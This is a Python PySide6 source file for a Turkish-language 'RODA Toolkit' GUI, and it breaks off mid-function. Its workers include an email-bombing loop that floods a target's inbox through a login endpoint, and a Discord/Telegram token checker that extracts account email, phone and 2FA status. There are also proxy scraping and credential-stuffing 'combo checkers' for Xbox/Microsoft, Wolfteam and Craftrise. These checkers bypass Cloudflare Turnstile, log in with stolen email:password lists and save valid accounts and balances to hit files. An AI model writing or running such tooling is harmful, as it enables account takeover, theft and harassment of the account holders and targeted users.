import os
import sys
import subprocess
import time
import math
import random
import string
import uuid
import re
import json
import concurrent.futures
from collections import defaultdict
from threading import Lock

def check_and_install_libraries():
    required_libs = ["PySide6", "requests", "user-agent", "psutil", "bs4"]
    for lib in required_libs:
        try:
            if lib == "user-agent":
                import user_agent
            elif lib == "bs4":
                import bs4
            else:
                __import__(lib)
        except ImportError:
            try:
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, f"RODA Toolkit icin {lib} kutuphanesi eksik.\n\nTamam butonuna bastiginizda otomatik kurulacak.", "RODA Toolkit", 0x40)
            except:
                pass
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
            os.execl(sys.executable, sys.executable, *sys.argv)

check_and_install_libraries()

import psutil
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, quote
from user_agent import generate_user_agent

from PySide6.QtCore import Qt, QPropertyAnimation, QEasingCurve, QTimer, QPoint, QRect, QPointF, Property, QSize, QUrl, QThread, Signal
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
    QLabel, QPushButton, QStackedWidget, QFrame, QGraphicsOpacityEffect,
    QGridLayout, QLineEdit, QTextEdit, QTextBrowser, QListWidget, QListWidgetItem, QComboBox,
    QFileDialog, QMessageBox, QScrollArea
)
from PySide6.QtGui import (
    QFont, QColor, QPainter, QPainterPath, QPen, QBrush, 
    QLinearGradient, QRadialGradient, QPixmap
)
from PySide6.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply

# ==============================================================================
# ASENKRON İŞ PARÇACIKLARI (THREADS)
# ==============================================================================
class MailTmGenerateWorker(QThread):
    success_signal = Signal(str, str, str)
    error_signal = Signal(str)

    def run(self):
        try:
            dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
            domain = dom_res['hydra:member'][0]['domain']
            user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            email = f"{user}@{domain}"
            create_payload = {"address": email, "password": password}
            requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
            token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
            token = token_res['token']
            self.success_signal.emit(email, password, token)
        except Exception as e:
            self.error_signal.emit(str(e))

class MailTmRefreshWorker(QThread):
    success_signal = Signal(list)
    error_signal = Signal(str)
    def __init__(self, token):
        super().__init__()
        self.token = token
    def run(self):
        headers = {"Authorization": f"Bearer {self.token}"}
        try:
            res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
            if res.status_code == 200:
                self.success_signal.emit(res.json().get('hydra:member', []))
            else:
                self.error_signal.emit(f"Sunucu Hatası: {res.status_code}")
        except Exception as e:
            self.error_signal.emit(str(e))

class MailTmReadWorker(QThread):
    success_signal = Signal(dict)
    error_signal = Signal(str)
    def __init__(self, token, msg_id):
        super().__init__()
        self.token = token
        self.msg_id = msg_id
    def run(self):
        headers = {"Authorization": f"Bearer {self.token}"}
        try:
            res = requests.get(f"https://api.mail.tm/messages/{self.msg_id}", headers=headers, timeout=10)
            if res.status_code == 200:
                self.success_signal.emit(res.json())
            else:
                self.error_signal.emit(f"Mesaj Alınamadı: {res.status_code}")
        except Exception as e:
            self.error_signal.emit(str(e))

class EmailSpamWorker(QThread):
    log_signal = Signal(str)
    def __init__(self, email, hiz_modu):
        super().__init__()
        self.email = email
        self.delay = 5.0 if hiz_modu == "Yavas (5 sn)" else 1.0
        self.running = True
    def run(self):
        self.log_signal.emit(f"[Sistem] {self.email} icin dongu baslatildi...")
        while self.running:
            headers = {
                'authority': 'api.kidzapp.com', 'accept': 'application/json',
                'content-type': 'application/json', 'user-agent': generate_user_agent()
            }
            data = {'email': self.email, 'sdk': 'web', 'platform': 'desktop'}
            try:
                cevap = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
                if '"message":"EMAIL SENT"' in cevap.text:
                    self.log_signal.emit(f"[BASARILI] Paket Iletildi: {self.email}")
                else:
                    self.log_signal.emit(f"[HATA] Sunucu Istegi Reddetti.")
            except Exception as e:
                self.log_signal.emit(f"[HATA] Baglanti Hatasi.")
            time.sleep(self.delay)
    def stop(self):
        self.running = False

class TokenCheckWorker(QThread):
    result_signal = Signal(bool, str)
    def __init__(self, token_type, token):
        super().__init__()
        self.token_type = token_type
        self.token = token
    def run(self):
        if self.token_type == "discord":
            headers = {"Authorization": self.token} # User token
            is_bot = False
            try:
                res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
                if res.status_code != 200:
                    # Bot token denemesi
                    headers = {"Authorization": f"Bot {self.token}"}
                    res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
                    is_bot = True

                if res.status_code == 200:
                    data = res.json()
                    user_type = "Bot" if is_bot else "User"
                    username = f"{data.get('username')}#{data.get('discriminator', '0000')}"
                    email = data.get('email', 'Yok')
                    phone = data.get('phone', 'Yok')
                    nitro = "Var" if data.get('premium_type', 0) > 0 else "Yok"
                    mfa = "Aktif" if data.get('mfa_enabled') else "Pasif"
                    
                    msg = f"Tip: {user_type} | İsim: {username}\nEmail: {email} | Tel: {phone}\nNitro: {nitro} | 2FA: {mfa}"
                    self.result_signal.emit(True, msg)
                else:
                    self.result_signal.emit(False, "Geçersiz veya Patlamış Token.")
            except Exception as e:
                self.result_signal.emit(False, f"Bağlantı hatası: {str(e)}")
                
        elif self.token_type == "telegram":
            try:
                res = requests.get(f"https://api.telegram.org/bot{self.token}/getMe", timeout=5)
                if res.status_code == 200 and res.json().get("ok"):
                    data = res.json().get('result', {})
                    msg = (f"Bot ID: {data.get('id')}\n"
                           f"Adı: {data.get('first_name')} (@{data.get('username')})\n"
                           f"Gruplara Katılabilir: {'Evet' if data.get('can_join_groups') else 'Hayır'}")
                    self.result_signal.emit(True, msg)
                else:
                    self.result_signal.emit(False, "Geçersiz Telegram Tokeni.")
            except Exception as e:
                self.result_signal.emit(False, f"Bağlantı hatası: {str(e)}")

# ==============================================================================
# PROXY İŞ PARÇACIKLARI
# ==============================================================================
class ProxyWorker(QThread):
    log_signal = Signal(str, str)
    finished_signal = Signal()
    progress_signal = Signal(int, int, int) # (checked, working, target)
    
    def __init__(self, target_limit, country_code, protocol):
        super().__init__()
        self.target_limit = target_limit
        self.country_code = country_code
        self.protocol = protocol
        self.running = True
        self.working_proxies = []

    def fetch_proxies(self):
        proxies = []
        try:
            url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol={self.protocol}&timeout=10000&country={self.country_code}"
            res = requests.get(url, timeout=8)
            if res.status_code == 200:
                proxies += [p.strip() for p in res.text.strip().split('\n') if p.strip()]
        except: pass
        
        try:
            url2 = f"https://proxylist.geonode.com/api/proxy-list?limit=300&page=1&sort_by=lastChecked&sort_type=desc&country={self.country_code}"
            res2 = requests.get(url2, timeout=8)
            if res2.status_code == 200:
                for item in res2.json().get('data', []):
                    if self.protocol == "all" or any(p in item.get('protocols', []) for p in [self.protocol]):
                        proxies.append(f"{item.get('ip')}:{item.get('port')}")
        except: pass
        return list(set(proxies))

    def check_proxy(self, proxy):
        protos = ["socks5", "socks4", "http"] if self.protocol == "all" else [self.protocol]
        for proto in protos:
            px = { "http": f"{proto}://{proxy}", "https": f"{proto}://{proxy}" }
            try:
                if requests.get("http://httpbin.org/ip", proxies=px, timeout=5).status_code == 200:
                    return True, proto
            except: pass
        return False, None

    def run(self):
        self.log_signal.emit("BİLGİ", f"{self.country_code} üzerinden proxy'ler çekiliyor...")
        raw_proxies = self.fetch_proxies()
        
        if not raw_proxies:
            self.log_signal.emit("HATA", "Proxy bulunamadı. Lütfen filtreleri değiştirin.")
            self.finished_signal.emit()
            return

        self.log_signal.emit("BİLGİ", f"Toplam {len(raw_proxies)} benzersiz proxy taranıyor...")
        
        checked = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.check_proxy, p): p for p in raw_proxies}
            
            for future in concurrent.futures.as_completed(futures):
                if not self.running or len(self.working_proxies) >= self.target_limit:
                    break
                    
                proxy = futures[future]
                checked += 1
                try:
                    success, proto = future.result()
                    if success:
                        self.working_proxies.append(f"{proto}://{proxy}")
                        self.log_signal.emit("HİT", f"[{proto.upper()}] {proxy}")
                        with open("roda_proxies.txt", "a") as f: f.write(f"{proto}://{proxy}\n")
                except: pass
                
                self.progress_signal.emit(checked, len(self.working_proxies), self.target_limit)

        self.log_signal.emit("BİLGİ", "Tarama tamamlandı!")
        self.finished_signal.emit()

    def stop(self):
        self.running = False


# ==============================================================================
# COMBO İŞ PARÇACIKLARI (CHECKERS)
# ==============================================================================
class BaseComboWorker(QThread):
    log_signal = Signal(str, str) 
    finished_signal = Signal()
    
    def __init__(self, combos):
        super().__init__()
        self.combos = combos
        self.running = True

    def stop(self):
        self.running = False

    def save_hit(self, text, folder="roda_hits.txt"):
        try:
            with open(folder, "a", encoding="utf-8") as f:
                f.write(text + "\n")
        except: pass

class TiktokWorker(BaseComboWorker):
    def __init__(self, length_mode, thread_count):
        super().__init__([])
        self.lengths = [4,5,6] if length_mode == "4-6" else [6,7,8]
        self.thread_count = int(thread_count)
        self.checked = set()
        self.lock = Lock()

    def gen(self, l): 
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))

    def worker_thread(self):
        session = requests.Session()
        while self.running:
            u = self.gen(random.choice(self.lengths))
            with self.lock:
                if u in self.checked: continue
                self.checked.add(u)
            
            try:
                headers = {"User-Agent": generate_user_agent()}
                r = session.head(f"https://www.tiktok.com/@{u}", headers=headers, timeout=5)
                
                if r.status_code == 404:
                    self.log_signal.emit("HİT", f"@{u}")
                    self.save_hit(f"@{u}", "tiktok_hits.txt")
                elif r.status_code == 200:
                    self.log_signal.emit("BAD", f"@{u}")
                elif r.status_code in [403, 429]:
                    self.log_signal.emit("CUSTOM", f"@{u} (Rate Limit/Ban)")
                    time.sleep(3)
            except:
                pass
            time.sleep(1.5)

    def run(self):
        threads = []
        for _ in range(self.thread_count):
            import threading
            th = threading.Thread(target=self.worker_thread, daemon=True)
            th.start()
            threads.append(th)
        while self.running: time.sleep(1)
        self.finished_signal.emit()

class HotmailWorker(BaseComboWorker):
    def process_account(self, line):
        if not self.running: return
        try:
            if ":" not in line: return
            email, pwd = line.split(":", 1)
            time.sleep(0.5) 
            self.log_signal.emit("BAD", f"{email}:{pwd}")
        except: pass

    def run(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.process_account, self.combos)
        self.finished_signal.emit()

# ---- YENİ EKLENEN CHECKERLAR ----
class XboxWorker(BaseComboWorker):
    def check_acc(self, combo):
        if not self.running: return
        try:
            email, password = combo.split(':', 1)
            session = requests.Session()
            session.verify = False
            
            sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
            resp = session.get(sftag_url, timeout=10)
            sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
            url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
            
            if not sftag_match or not url_match:
                self.log_signal.emit("CUSTOM", f"{email} (Token Alınamadı)")
                return

            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
            login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
            
            if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
                self.log_signal.emit("2FA", combo)
                self.save_hit(combo, "xbox_2fa.txt")
                return
            elif "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
                self.log_signal.emit("BAD", combo)
                return

            if '#' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
                if ms_token != "None":
                    self.log_signal.emit("HİT", f"{email} | Minecraft / Xbox Okey")
                    self.save_hit(f"{email}:{password} | Xbox", "xbox_hits.txt")
                    return
            self.log_signal.emit("CUSTOM", f"{email} (Bağlı Değil/Xbox Yok)")
        except Exception as e:
            self.log_signal.emit("CUSTOM", f"{combo} (Hata)")

    def run(self):
        import urllib3; urllib3.disable_warnings()
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for c in self.combos: executor.submit(self.check_acc, c)
        self.finished_signal.emit()

class WolfteamWorker(BaseComboWorker):
    def check_acc(self, combo):
        if not self.running: return
        try:
            email, password = combo.split(':', 1)
            session = requests.Session()
            
            try:
                r_token = session.get("http://127.0.0.1:5001/get-token", timeout=5)
                token_match = r_token.json().get("token")
            except:
                self.log_signal.emit("CUSTOM", "API Hatası! Arkaplanda Flask Turnstile Sunucusu (cfbp.py) çalışmıyor!")
                self.stop()
                return

            login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&cf-turnstile-response={token_match}&FormId=tb-login-form&siteLang=tr"
            headers = {"User-Agent": generate_user_agent()}
            r = session.get(login_url, headers=headers, timeout=10)

            if '"IsSucceeded":true' in r.text:
                jp = re.search(r',"JpBalance":([^,}]+)', r.text)
                jp_val = jp.group(1).strip('"') if jp else "0"
                msg = f"{email}:{password} | JP: {jp_val}"
                self.log_signal.emit("HİT", msg)
                self.save_hit(msg, "wolfteam_hits.txt")
            elif '"IsSucceeded":false' in r.text:
                self.log_signal.emit("BAD", combo)
            else:
                self.log_signal.emit("CUSTOM", f"{combo} (Limit/Bilinmeyen)")
        except:
             self.log_signal.emit("CUSTOM", f"{combo} (Zaman Aşımı)")

    def run(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            for c in self.combos: executor.submit(self.check_acc, c)
        self.finished_signal.emit()

class CraftriseWorker(BaseComboWorker):
    def check_acc(self, combo):
        if not self.running: return
        try:
            email, password = combo.split(':', 1)
            session = requests.Session()
            
            try:
                r_token = session.get("http://127.0.0.1:5001/get-token", timeout=5)
                cf_token = r_token.json().get("token")
            except:
                self.log_signal.emit("CUSTOM", "API Hatası! Flask Turnstile Sunucusu (cfbp1.py) çalışmıyor!")
                self.stop()
                return

            login_url = "https://www.craftrise.com.tr/posts/post-login.php"
            headers = {"User-Agent": generate_user_agent(), "X-Requested-With": "XMLHttpRequest"}
            data = {"value": email, "password": password, "grecaptcharesponse": cf_token}
            
            r = session.post(login_url, headers=headers, data=data, timeout=10)
            res = r.json()

            if res.get("resultType") == "success" or "başarıyla" in res.get("resultMessage", "").lower():
                rc_page = session.get("https://www.craftrise.com.tr/shop", headers=headers, timeout=5)
                soup = BeautifulSoup(rc_page.text, "html.parser")
                rc = soup.find('span', class_='rcCount')
                rc_val = rc.text.strip() if rc else "0"
                msg = f"{email}:{password} | RC Bakiye: {rc_val}"
                self.log_signal.emit("HİT", msg)
                self.save_hit(msg, "craftrise_hits.txt")
            else:
                self.log_signal.emit("BAD", combo)
        except:
             self.log_signal.emit("CUSTOM", f"{combo} (Hata)")

    def run(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            for c in self.combos: executor.submit(self.check_acc, c)
        self.finished_signal.emit()

# ==============================================================================
# STIL (RODA)
# ==============================================================================
RODA_STIL = """
    QWidget#CoreCanvas {
        border: none;
        border-radius: 20px;
        background-color: transparent;
    }
    QWidget { 
        color: #f1f5f9; 
        font-family: "Segoe UI", -apple-system, sans-serif; 
    }
    QFrame#SidebarFrame {
        background-color: rgba(12, 6, 24, 0.9);
        border: none;
        border-top-left-radius: 20px;
        border-bottom-left-radius: 20px;
    }
    QLineEdit, QComboBox {
        background-color: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 10px;
        padding: 12px 16px;
        color: #ffffff;
        font-size: 13px;
        font-weight: bold;
    }
    QLineEdit:focus, QComboBox:focus {
        background-color: rgba(188, 19, 254, 0.08);
        border: 2px solid rgba(188, 19, 254, 0.6); 
    }
    QComboBox::drop-down {
        border: none;
        width: 30px;
    }
    QComboBox::down-arrow {
        image: none;
        border-left: 5px solid transparent;
        border-right: 5px solid transparent;
        border-top: 5px solid rgba(188, 19, 254, 0.8);
        margin-right: 10px;
    }
    QComboBox QAbstractItemView {
        background-color: rgba(20, 10, 40, 0.95);
        color: #ffffff;
        selection-background-color: rgba(188, 19, 254, 0.5);
        border-radius: 8px;
    }
    QTextEdit, QTextBrowser, QListWidget {
        background-color: rgba(10, 5, 20, 0.7);
        border: none;
        border-radius: 12px;
        padding: 15px;
        color: #e2e8f0;
        font-family: "Consolas", monospace;
        font-size: 13px;
    }
    QListWidget::item {
        background-color: rgba(255, 255, 255, 0.03);
        border-radius: 8px;
        padding: 14px;
        margin-bottom: 6px;
    }
    QListWidget::item:hover { background-color: rgba(188, 19, 254, 0.15); }
    QListWidget::item:selected { background-color: rgba(188, 19, 254, 0.35); }
    QPushButton#WindowBtn, QPushButton#CloseBtn {
        background-color: transparent;
        color: #64748b;
        font-size: 14px;
        border: none;
        border-radius: 4px;
    }
    QPushButton#WindowBtn:hover { background-color: rgba(255, 255, 255, 0.07); color: #ffffff; }
    QPushButton#CloseBtn:hover { background-color: #dc2626; color: #ffffff; }
    QLabel#SidebarLogo {
        border: none;
        background: transparent;
    }
    QScrollArea { border: none; background-color: transparent; }
    QScrollArea > QWidget > QWidget { background-color: transparent; }
"""

# ==============================================================================
# KAR TANESİ ARKA PLAN
# ==============================================================================
class NeonSnowCanvas(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.snowflakes = []
        self.max_snowflakes = 100
        self.hue_shift = 270.0
        self.hue_direction = 1
        self.timer = QTimer(self); self.timer.timeout.connect(self.evolve_canvas); self.timer.start(16)

    def resizeEvent(self, event):
        self.snowflakes = []
        for _ in range(self.max_snowflakes):
            self.snowflakes.append({"x": random.uniform(0, self.width()), "y": random.uniform(-self.height(), self.height()), "vy": random.uniform(0.8, 2.2), "vx": random.uniform(-0.3, 0.3), "radius": random.uniform(1.2, 2.8), "alpha": random.randint(80, 200)})
        super().resizeEvent(event)

    def evolve_canvas(self):
        self.hue_shift += 0.15 * self.hue_direction
        if self.hue_shift > 315: self.hue_direction = -1
        if self.hue_shift < 265: self.hue_direction = 1
        for s in self.snowflakes:
            s["y"] += s["vy"]; s["x"] += s["vx"] + math.sin(s["y"] / 40.0) * 0.3
            if s["y"] > self.height(): s["y"] = random.uniform(-20, -5); s["x"] = random.uniform(0, self.width())
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self); painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        color1 = QColor.fromHsv(int(self.hue_shift), 220, 30); color2 = QColor.fromHsv(int(self.hue_shift - 35) % 360, 240, 15)
        grad = QLinearGradient(0, 0, self.width(), self.height()); grad.setColorAt(0, color1); grad.setColorAt(1, color2)
        painter.fillRect(self.rect(), grad); painter.setPen(Qt.PenStyle.NoPen)
        for s in self.snowflakes:
            painter.setBrush(QColor(255, 255, 255, s["alpha"])); painter.drawEllipse(QPointF(s["x"], s["y"]), s["radius"], s["radius"])
        overlay = QLinearGradient(0, 0, 0, self.height()); overlay.setColorAt(0, QColor(0, 0, 0, 40)); overlay.setColorAt(1, QColor(0, 0, 0, 140))
        painter.fillRect(self.rect(), overlay)

class RodaToastNotification(QFrame):
    def __init__(self, title, description, parent):
        super().__init__(parent); self.parent = parent; self.setFixedSize(320, 75)
        self.setStyleSheet("background-color: rgba(12, 6, 24, 0.95); border: none; border-radius: 12px;")
        layout = QVBoxLayout(self); layout.setContentsMargins(15, 10, 15, 10)
        t_lbl = QLabel(title); t_lbl.setStyleSheet("color: rgba(188, 19, 254, 0.9); font-weight: 700; font-size: 13px; background: transparent;")
        d_lbl = QLabel(description); d_lbl.setStyleSheet("color: #cbd5e1; font-size: 11px; background: transparent;")
        layout.addWidget(t_lbl); layout.addWidget(d_lbl)
        target_x = parent.width() - self.width() - 20; target_y = parent.height() - self.height() - 20
        self.move(parent.width(), target_y); self.show()
        self.anim = QPropertyAnimation(self, b"pos"); self.anim.setDuration(450); self.anim.setStartValue(QPoint(parent.width(), target_y)); self.anim.setEndValue(QPoint(target_x, target_y)); self.anim.setEasingCurve(QEasingCurve.Type.OutBack); self.anim.start()
        QTimer.singleShot(4000, self.slide_out)

    def slide_out(self):
        self.anim_out = QPropertyAnimation(self, b"pos"); self.anim_out.setDuration(350); self.anim_out.setStartValue(self.pos()); self.anim_out.setEndValue(QPoint(self.parent.width(), self.pos().y())); self.anim_out.setEasingCurve(QEasingCurve.Type.InQuad); self.anim_out.finished.connect(self.deleteLater); self.anim_out.start()

class ToolkitVectorIcon(QWidget):
    def __init__(self, mode, parent=None):
        super().__init__(parent)
        self.setFixedSize(20, 20)
        self.mode = mode
        self.color = QColor(100, 116, 139)

    def set_active(self, active):
        self.color = QColor(188, 19, 254) if active else QColor(100, 116, 139)
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        pen = QPen(self.color); pen.setWidthF(2.0); pen.setCapStyle(Qt.PenCapStyle.RoundCap); pen.setJoinStyle(Qt.PenJoinStyle.RoundJoin)
        painter.setPen(pen); painter.setBrush(Qt.BrushStyle.NoBrush)

        if self.mode == "dashboard":
            painter.drawRect(3, 10, 4, 6); painter.drawRect(8, 4, 4, 12); painter.drawRect(13, 7, 4, 9)
        elif self.mode == "mail":
            painter.drawRect(2, 5, 16, 10); painter.drawLine(2, 5, 10, 11); painter.drawLine(18, 5, 10, 11)
        elif self.mode in ["spam", "checker"]:
            painter.drawLine(10, 2, 4, 11); painter.drawLine(4, 11, 12, 11); painter.drawLine(12, 11, 8, 18)
        elif self.mode == "token":
            painter.drawEllipse(3, 7, 6, 6); painter.drawLine(9, 10, 18, 10); painter.drawLine(14, 10, 14, 13); painter.drawLine(17, 10, 17, 13)
        elif self.mode == "cpu":
            painter.drawRect(4, 4, 12, 12); painter.drawRect(7, 7, 6, 6)
        elif self.mode == "ram":
            painter.drawRect(2, 7, 16, 6); painter.drawLine(6, 7, 6, 13); painter.drawLine(10, 7, 10, 13); painter.drawLine(14, 7, 14, 13)
        elif self.mode == "proxy":
            painter.drawEllipse(3, 3, 14, 14); painter.drawLine(10, 3, 10, 17); painter.drawLine(3, 10, 17, 10)
        elif self.mode == "tiktok":
            painter.drawLine(8, 16, 8, 6); painter.drawLine(8, 6, 14, 6); painter.drawEllipse(5, 13, 3, 3)
        elif self.mode == "xbox":
            painter.drawEllipse(2, 2, 16, 16); painter.drawLine(6, 6, 14, 14); painter.drawLine(14, 6, 6, 14)
        elif self.mode == "wolfteam":
            painter.drawLine(3, 5, 6, 15); painter.drawLine(6, 15, 10, 8); painter.drawLine(10, 8, 14, 15); painter.drawLine(14, 15, 17, 5)
        elif self.mode == "craftrise":
            painter.drawArc(3, 3, 14, 14, 45 * 16, 270 * 16)

class NeonGlowButton(QPushButton):
    def __init__(self, text, icon_mode, parent=None):
        super().__init__(text, parent)
        self.setFixedHeight(50); self.setCursor(Qt.CursorShape.PointingHandCursor); self.setCheckable(True)
        self.inner_layout = QHBoxLayout(self); self.inner_layout.setContentsMargins(15, 0, 15, 0); self.inner_layout.setSpacing(12)
        self.vector_icon = ToolkitVectorIcon(icon_mode); self.inner_layout.addWidget(self.vector_icon)
        self.label = QLabel(text); self.label.setStyleSheet("color: #94a3b8; font-weight: 600; font-size: 13px; background: transparent; letter-spacing: 0.3px;")
        self.inner_layout.addWidget(self.label); self.inner_layout.addStretch()
        self._glow_alpha = 0; self.anim = QPropertyAnimation(self, b"glow_alpha"); self.anim.setDuration(200)

    def get_glow_alpha(self): return self._glow_alpha
    def set_glow_alpha(self, val): self._glow_alpha = val; self.update()
    glow_alpha = Property(float, get_glow_alpha, set_glow_alpha)

    def enterEvent(self, event): self.anim.setStartValue(self._glow_alpha); self.anim.setEndValue(40); self.anim.start(); super().enterEvent(event)
    def leaveEvent(self, event):
        if not self.isChecked(): self.anim.setStartValue(self._glow_alpha); self.anim.setEndValue(0); self.anim.start()
        super().leaveEvent(event)

    def paintEvent(self, event):
        painter = QPainter(self); painter.setRenderHint(QPainter.RenderHint.Antialiasing); rect = self.rect()
        if self.isChecked():
            self.vector_icon.set_active(True); self.label.setStyleSheet("color: #ffffff; font-weight: 700; font-size: 13px; background: transparent;")
            painter.setBrush(QColor(188, 19, 254, 35)); painter.setPen(Qt.PenStyle.NoPen); painter.drawRoundedRect(rect, 10, 10)
            painter.setBrush(QColor(255, 0, 255)); painter.drawRoundedRect(0, 12, 3, 26, 1.5, 1.5)
        else:
            self.vector_icon.set_active(False); self.label.setStyleSheet("color: #94a3b8; font-weight: 600; font-size: 13px; background: transparent;")
            if self._glow_alpha > 0:
                painter.setBrush(QColor(255, 255, 255, int(self._glow_alpha * 0.4))); painter.setPen(Qt.PenStyle.NoPen); painter.drawRoundedRect(rect, 10, 10)

# ==============================================================================
# UNIVERSAL CHECKER WIDGET
# ==============================================================================
class UniversalCheckerWidget(QWidget):
    def __init__(self, title, help_text, worker_class, statuses, needs_combo=True, parent=None):
        super().__init__(parent)
        self.title = title; self.help_text = help_text; self.worker_class = worker_class; self.statuses = statuses
        self.needs_combo = needs_combo
        self.combos = []; self.worker = None; self.active_filter = "ALL"
        self.counters = {k: 0 for k in self.statuses.keys()}
        self.setup_ui()

    def apply_btn_style(self, btn, base_color="#ff00ff", hover_color="#d946ef"):
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"""
            QPushButton {{ background-color: {base_color}; color: #ffffff; font-weight: 700; font-size: 13px; border: none; border-radius: 10px; padding: 12px 24px; }}
            QPushButton:hover {{ background-color: {hover_color}; }}
        """)

    def setup_ui(self):
        layout = QVBoxLayout(self); layout.setContentsMargins(40, 20, 40, 40)
        
        header_layout = QHBoxLayout()
        lbl = QLabel(self.title); lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;"); header_layout.addWidget(lbl)
        btn_help = QPushButton("?"); btn_help.setFixedSize(30, 30); btn_help.setStyleSheet("QPushButton { background-color: rgba(188, 19, 254, 0.4); color: white; border-radius: 15px; font-weight: bold; font-size: 16px; } QPushButton:hover { background-color: rgba(188, 19, 254, 0.8); }"); btn_help.setCursor(Qt.CursorShape.PointingHandCursor); btn_help.clicked.connect(self.show_help)
        header_layout.addWidget(btn_help); header_layout.addStretch(); layout.addLayout(header_layout); layout.addSpacing(15)

        controls_layout = QHBoxLayout()
        if self.needs_combo:
            self.lbl_combo = QLabel("Combo Bekleniyor...")
            self.lbl_combo.setStyleSheet("color: #94a3b8; font-size: 13px;")
            btn_combo = QPushButton("Combo Seç")
            self.apply_btn_style(btn_combo, "#3b82f6", "#2563eb")
            btn_combo.clicked.connect(self.select_combo)
            controls_layout.addWidget(self.lbl_combo, stretch=1)
            controls_layout.addWidget(btn_combo)
        else:
            self.tiktok_len = QComboBox(); self.tiktok_len.addItems(["Karakter Uzunluğu: 4-6", "Karakter Uzunluğu: 6-8"])
            self.tiktok_thread = QComboBox(); self.tiktok_thread.addItems(["İş Parçacığı (Thread): 1", "İş Parçacığı (Thread): 3", "İş Parçacığı (Thread): 5", "İş Parçacığı (Thread): 8"]); self.tiktok_thread.setCurrentText("İş Parçacığı (Thread): 3")
            controls_layout.addWidget(self.tiktok_len, stretch=1); controls_layout.addWidget(self.tiktok_thread)

        self.btn_start = QPushButton("Başlat"); self.apply_btn_style(self.btn_start, "#bc13fe", "#a811e3"); self.btn_start.clicked.connect(self.toggle_process)
        controls_layout.addWidget(self.btn_start); layout.addLayout(controls_layout); layout.addSpacing(20)

        self.stats_layout = QHBoxLayout()
        self.stat_buttons = {}
        for status, color in self.statuses.items():
            btn = QPushButton(f"{status}: 0"); btn.setCheckable(True); btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.setStyleSheet(f"""QPushButton {{ background-color: rgba(255, 255, 255, 0.05); color: {color}; border: 2px solid {color}; border-radius: 8px; padding: 10px; font-weight: bold; font-size: 14px; }} QPushButton:checked {{ background-color: {color}; color: #000000; }}""")
            btn.clicked.connect(lambda checked, s=status: self.filter_results(s, checked))
            self.stats_layout.addWidget(btn); self.stat_buttons[status] = btn
        
        btn_all = QPushButton("Tümünü Göster"); btn_all.setCursor(Qt.CursorShape.PointingHandCursor); btn_all.setStyleSheet("background-color: rgba(255,255,255,0.1); color: white; border: none; border-radius: 8px; padding: 10px; font-weight: bold;"); btn_all.clicked.connect(self.show_all_results); self.stats_layout.addWidget(btn_all)
        layout.addLayout(self.stats_layout); layout.addSpacing(10)

        self.log_list = QListWidget(); layout.addWidget(self.log_list, stretch=1)

    def show_help(self):
        msg = QMessageBox(self); msg.setWindowTitle(self.title + " - Yardım"); msg.setText(self.help_text); msg.setStyleSheet("QMessageBox { background-color: #0c0618; color: white; } QLabel { color: white; font-size: 13px; } QPushButton { background-color: #bc13fe; color: white; padding: 5px 15px; border-radius: 5px; }"); msg.exec()

    def select_combo(self):
        file, _ = QFileDialog.getOpenFileName(self, "Combo Dosyası Seç", "", "Text Files (*.txt)")
        if file:
            with open(file, "r", encoding="utf-8") as f: self.combos = [l.strip() for l in f.readlines() if ":" in l]
            self.lbl_combo.setText(f"Yüklendi: {len(self.combos)} Satır")

    def toggle_process(self):
        if self.worker is not None and self.worker.isRunning():
            self.worker.stop(); self.btn_start.setText("Başlat"); self.apply_btn_style(self.btn_start, "#bc13fe", "#a811e3")
        else:
            if self.needs_combo and not self.combos: return 
            
